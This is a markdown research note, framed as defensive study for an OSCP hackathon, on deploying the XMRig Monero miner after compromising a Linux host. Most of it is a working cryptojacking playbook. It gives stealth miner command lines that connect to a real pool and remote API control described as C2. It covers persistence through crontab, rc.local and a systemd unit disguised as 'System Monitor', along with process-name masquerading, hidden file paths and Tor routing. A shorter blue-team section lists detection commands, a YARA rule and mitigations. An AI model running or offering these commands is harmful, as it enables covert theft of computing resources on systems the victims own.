# XMRig Payload Analysis - Defensive Security Research

**Date:** 2025-10-02
**Version:** XMRig 6.24.0
**Purpose:** Educational analysis for OSCP Hackathon - Defensive Security Research
**Binary Location:** `/home/kali/OSCP/defensive_research/xmrig_analysis/xmrig-6.24.0/`

---

## Binary Analysis

### File Information
```bash
File: xmrig
Type: ELF 64-bit LSB executable, x86-64, version 1 (SYSV)
Linking: Statically linked (no external dependencies)
Size: 8.0 MB
Stripped: Yes (debugging symbols removed)
BuildID: ad34d49df4171e0ae93aa6d8d91e54679714eb2e
SHA256: 129cfbfbe4c37a970abab20202639c1481ed0674ff9420d507f6ca4f2ed7796a
```

### Key Characteristics for Payload Crafting

**1. Static Binary**
- No library dependencies (`ldd` reports "not a dynamic executable")
- Self-contained - works on any Linux system
- Ideal for post-exploitation (no missing dependencies)
- Larger file size (8MB) - may be detected by size-based filters

**2. Stripped Binary**
- Debugging symbols removed
- Harder to reverse-engineer
- Function names obfuscated

---

## Configuration Analysis

### Default Configuration (config.json)

#### Mining Pool Configuration
```json
"pools": [
    {
        "url": "donate.v2.xmrig.com:3333",
        "user": "YOUR_WALLET_ADDRESS",
        "pass": "x",
        "tls": false,
        "keepalive": false
    }
]
```

#### CPU Mining Settings
```json
"cpu": {
    "enabled": true,
    "huge-pages": true,
    "priority": null,
    "max-threads-hint": 100
}
```

#### API/Management Interface
```json
"http": {
    "enabled": false,
    "host": "127.0.0.1",
    "port": 0,
    "access-token": null,
    "restricted": true
}
```

#### Stealth Settings
```json
"background": false,
"colors": true,
"log-file": null,
"syslog": false,
"pause-on-battery": false,
"pause-on-active": false
```

---

## Command-Line Options for Payload Crafting

### Essential Flags for Post-Exploitation

#### Network Configuration
```bash
-o, --url=URL                 # Mining pool URL
-u, --user=USERNAME           # Wallet address
-p, --pass=PASSWORD           # Pool password (usually "x")
-k, --keepalive               # Prevent connection timeout
--tls                         # Enable SSL/TLS (harder to inspect traffic)
```

#### Stealth & Evasion
```bash
-B, --background              # Run in background (daemon mode)
-l, --log-file=FILE           # Log to file (avoid stdout detection)
-S, --syslog                  # Use system log
--no-color                    # Disable colored output
--pause-on-active=N           # Pause when user active (avoid detection)
--pause-on-battery            # Pause on battery (laptops only)
```

#### Resource Control (Avoid Detection)
```bash
-t, --threads=N               # Limit CPU threads (lower = stealthier)
--cpu-priority=N              # Set process priority (0=idle, 2=normal, 5=highest)
--cpu-max-threads-hint=N      # Max CPU usage percentage
--no-huge-pages               # Disable huge pages (less memory spike)
```

#### API for Remote Management (C2 Simulation)
```bash
--http-host=HOST              # Bind API to interface
--http-port=N                 # API port for remote control
--http-access-token=T         # Authentication token
--http-no-restricted          # Full remote access
```

---

## Payload Crafting Scenarios

### Scenario 1: Maximum Stealth (Low Detection)
```bash
./xmrig \
  -o pool.supportxmr.com:3333 \
  -u <WALLET_ADDRESS> \
  -p x \
  --tls \
  -B \
  --no-color \
  -t 1 \
  --cpu-priority=0 \
  --pause-on-active=60 \
  -l /tmp/.xmrig.log
```

**Flags Explained:**
- `-o pool.supportxmr.com:3333`: Connect to mining pool over port 3333
- `-u <WALLET_ADDRESS>`: Attacker's Monero wallet
- `-p x`: Standard pool password
- `--tls`: Encrypt traffic (harder to detect via network inspection)
- `-B`: Background mode (no terminal output)
- `--no-color`: Suppress ANSI colors
- `-t 1`: Use only 1 CPU thread (minimal resource usage)
- `--cpu-priority=0`: Idle priority (minimal system impact)
- `--pause-on-active=60`: Pause when user active, resume after 60s idle
- `-l /tmp/.xmrig.log`: Hidden log file in temp directory

**Detection Difficulty:** HIGH
**Mining Performance:** LOW (1 thread)
**Use Case:** Long-term persistence on active user systems

---

### Scenario 2: Aggressive Mining (Maximum Performance)
```bash
./xmrig \
  -o pool.supportxmr.com:3333 \
  -u <WALLET_ADDRESS> \
  -p x \
  --tls \
  -t 0 \
  --cpu-priority=5 \
  --randomx-1gb-pages \
  --huge-pages-jit \
  -l /var/log/syslog
```

**Flags Explained:**
- `-t 0`: Auto-detect and use all available CPU threads
- `--cpu-priority=5`: Highest process priority
- `--randomx-1gb-pages`: Use 1GB hugepages for RandomX (performance boost)
- `--huge-pages-jit`: Enable huge pages for JIT compilation
- `-l /var/log/syslog`: Log to system log (blend in with legitimate logs)

**Detection Difficulty:** LOW (high CPU usage visible)
**Mining Performance:** MAXIMUM
**Use Case:** Short-term exploitation on servers

---

### Scenario 3: Remote C2 Control
```bash
./xmrig \
  -o pool.supportxmr.com:3333 \
  -u <WALLET_ADDRESS> \
  -p x \
  --tls \
  -B \
  --http-host=0.0.0.0 \
  --http-port=8080 \
  --http-access-token=SecretToken123 \
  --http-no-restricted \
  -t 2
```

**Flags Explained:**
- `--http-host=0.0.0.0`: Bind API to all interfaces (remote access)
- `--http-port=8080`: API listening on port 8080
- `--http-access-token=SecretToken123`: Authentication token
- `--http-no-restricted`: Allow full remote control
- `-t 2`: Use 2 threads (balance stealth/performance)

**API Endpoints (Accessible via HTTP):**
```bash
# Get miner status
curl http://TARGET:8080/2/summary -H "Authorization: Bearer SecretToken123"

# Pause mining
curl -X POST http://TARGET:8080/2/pause -H "Authorization: Bearer SecretToken123"

# Resume mining
curl -X POST http://TARGET:8080/2/resume -H "Authorization: Bearer SecretToken123"

# Update configuration
curl -X POST http://TARGET:8080/2/config -H "Authorization: Bearer SecretToken123" -d '{"cpu":{"enabled":true}}'
```

**Detection Difficulty:** MEDIUM
**Mining Performance:** MEDIUM
**Use Case:** Remote-controlled botnet simulation

---

### Scenario 4: Config File Method (Persistent)
```bash
# Create custom config
cat > /tmp/.config.json <<EOF
{
    "autosave": false,
    "background": true,
    "colors": false,
    "randomx": {
        "mode": "light",
        "1gb-pages": false
    },
    "cpu": {
        "enabled": true,
        "max-threads-hint": 25,
        "priority": 0
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "WALLET_ADDRESS",
            "pass": "x",
            "tls": true,
            "keepalive": true
        }
    ],
    "log-file": "/dev/null",
    "pause-on-active": 120
}
EOF

# Execute with config
./xmrig -c /tmp/.config.json
```

**Advantages:**
- More configuration options
- Easier to modify remotely
- Can be updated without restarting binary

---

## Persistence Methods

### Cron Job (Linux)
```bash
# Add to user's crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/.xmrig -c /tmp/.config.json >/dev/null 2>&1") | crontab -

# OR system-wide
echo "@reboot root /opt/.xmrig -c /opt/.config.json" >> /etc/crontab
```

### Systemd Service (Linux)
```bash
cat > /etc/systemd/system/xmrig.service <<EOF
[Unit]
Description=System Monitor
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/local/bin/xmrig -c /etc/xmrig/config.json
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable xmrig.service
systemctl start xmrig.service
```

### RC.local (Legacy Systems)
```bash
echo "/usr/local/bin/xmrig -c /etc/xmrig/config.json &" >> /etc/rc.local
chmod +x /etc/rc.local
```

---

## Obfuscation & Evasion Techniques

### Binary Renaming (Process Name Masquerading)
```bash
# Copy to legitimate-sounding name
cp xmrig /usr/bin/systemd-monitor
cp xmrig /usr/sbin/kworker
cp xmrig /opt/java-updater

# Execute with fake name
mv xmrig /tmp/[kworker/0:1]  # Mimics kernel worker threads
```

### File Hiding
```bash
# Hidden directory
mkdir /tmp/...
cp xmrig /tmp/.../systemd

# Hidden in system directories
cp xmrig /usr/lib/systemd/.cache/daemon
cp xmrig /var/cache/.fonts/update
```

### Traffic Obfuscation
```bash
# Use TLS on port 443 (looks like HTTPS)
-o pool.supportxmr.com:443 --tls

# Use proxy to hide destination
-x socks5://127.0.0.1:9050  # Route through Tor
```

---

## Detection Indicators (Blue Team Perspective)

### Process Indicators
```bash
# High CPU usage from unknown process
top -b -n 1 | grep -E "90|80|70"

# Process without parent (orphaned)
ps auxf | grep xmrig

# Unusual process names
ps aux | grep -E "\[.*\]|^\."
```

### Network Indicators
```bash
# Connections to mining pools (common ports: 3333, 4444, 5555, 443)
netstat -tunap | grep -E ":3333|:4444|:5555"

# High outbound traffic
iftop -P

# DNS lookups to mining pools
grep -E "pool|mine|xmr|monero" /var/log/syslog
```

### File Indicators
```bash
# Recently modified binaries in suspicious locations
find /tmp /var/tmp /dev/shm -type f -executable -mtime -1

# Hidden files
find / -name ".*" -executable 2>/dev/null

# Large files in temp directories
find /tmp -type f -size +5M
```

### System Indicators
```bash
# Sustained high CPU usage
uptime  # Check load average

# Memory usage spikes
free -h

# Cron jobs by users
crontab -l
grep -r xmrig /var/spool/cron/ /etc/cron*
```

---

## YARA Detection Rule

```yara
rule XMRig_Monero_Miner {
    meta:
        description = "Detects XMRig Monero miner binary"
        author = "OSCP Student"
        date = "2025-10-02"

    strings:
        $str1 = "donate.v2.xmrig.com" ascii
        $str2 = "donate.ssl.xmrig.com" ascii
        $str3 = "pool_wallet" ascii
        $str4 = "randomx" nocase
        $str5 = "huge-pages" ascii
        $str6 = "algo=rx/0" ascii

    condition:
        uint32(0) == 0x464c457f and  // ELF magic bytes
        filesize > 5MB and
        3 of ($str*)
}
```

---

## Mitigation Strategies

### Prevention
1. **Application Whitelisting:** Only allow authorized executables
2. **File Integrity Monitoring:** Detect unauthorized file changes (AIDE, Tripwire)
3. **Least Privilege:** Run services with minimal permissions
4. **Network Segmentation:** Block outbound connections to mining pools
5. **CPU Resource Limits:** cgroups, ulimit

### Detection
1. **CPU Monitoring:** Alert on sustained >70% CPU usage
2. **Network Monitoring:** Block known mining pool IPs/domains
3. **Process Monitoring:** Audit new processes (auditd)
4. **Behavioral Analysis:** Detect RandomX algorithm signatures

### Response
1. **Kill Process:** `pkill xmrig` or `kill -9 <PID>`
2. **Remove Persistence:** Check cron, systemd, rc.local
3. **Network Block:** `iptables -A OUTPUT -d POOL_IP -j DROP`
4. **Forensic Analysis:** Capture memory dump, network PCAP

---

## Exam Relevance (OSCP)

### Skills Demonstrated
- **Post-Exploitation:** Deploying payloads after initial compromise
- **Persistence:** Maintaining access through reboots
- **Evasion:** Avoiding detection by blue team
- **Lateral Movement:** Spreading miner across network
- **Privilege Escalation:** Deploying as root for better performance

### Time Estimates
- Download & deploy: 2-3 minutes
- Configure stealth mode: 5 minutes
- Establish persistence: 5-10 minutes
- Verify operation: 5 minutes
- **Total:** 15-20 minutes

---

## Alternative Approaches

### Compiled from Source (Customization)
```bash
# Clone repository
git clone https://github.com/xmrig/xmrig.git
cd xmrig

# Modify source (change strings, add features)
vim src/donate.h  # Change donation level
vim src/version.h  # Change version string

# Build
mkdir build && cd build
cmake .. -DWITH_HWLOC=OFF
make -j$(nproc)
```

### Containerized (Docker)
```bash
docker run -d --restart=unless-stopped \
  -e POOL_URL=pool.supportxmr.com:3333 \
  -e WALLET_ADDRESS=YOUR_WALLET \
  metal3d/xmrig
```

---

## Legal & Ethical Disclaimer

**WARNING:** Deploying cryptocurrency miners on systems you do not own or have explicit permission to test is **ILLEGAL** and unethical.

**Authorized Use Cases:**
- Personal lab environments
- Authorized penetration testing engagements
- Security research with written permission
- Educational demonstrations in controlled environments

**This analysis is for DEFENSIVE SECURITY EDUCATION ONLY.**

---

## References

- Official XMRig Documentation: https://xmrig.com/docs
- XMRig GitHub: https://github.com/xmrig/xmrig
- Monero Mining Pools: https://miningpoolstats.stream/monero
- RandomX Algorithm: https://github.com/tevador/RandomX

---

## Next Steps for Hackathon

1. **Create detection playbook** documenting all IOCs
2. **Build Splunk/ELK alerts** for mining activity
3. **Develop mitigation scripts** for incident response
4. **Test evasion techniques** against common AV/EDR
5. **Document full attack chain** from initial access to cryptojacking
6. **Create blue team training** scenario

**Educational Objective:** Teach defenders how real-world cryptojacking attacks work and how to detect/prevent them.
